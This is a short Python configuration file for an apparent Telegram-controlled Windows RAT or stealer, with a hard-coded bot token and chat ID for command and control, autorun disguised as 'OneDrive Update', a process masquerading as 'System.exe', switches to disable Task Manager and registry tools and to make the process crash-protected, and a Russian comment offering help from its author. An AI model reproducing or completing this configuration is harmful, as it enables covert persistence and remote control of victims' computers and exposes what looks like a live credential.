###########################################
from telebot                       import util
from telebot.util                  import ThreadPool
###########################################


TelegramToken = '8348609589:AAHZYIR7s2GpHn-YUTlN3706XvhwBAzIsnI'
TelegramChatID = '7280030041'


AdminRightsRequired = False 
AutorunEnabled = true
DisableTaskManager = False
DisableRegistryTools = False 
ProcessBSODProtectionEnabled = False


InstallPath = 'C:\\ProgramData\\'
Directory = 'C:\\Windows\\Temp\\Telegramm\\'


AutorunName = 'OneDrive Update'
ProcessName = 'System.exe'
DisplayMessageBox = False
Message = 'Message'

#Если сложно, или что то не получается, то пиши мне - @Xx_CKAMEP_xX 
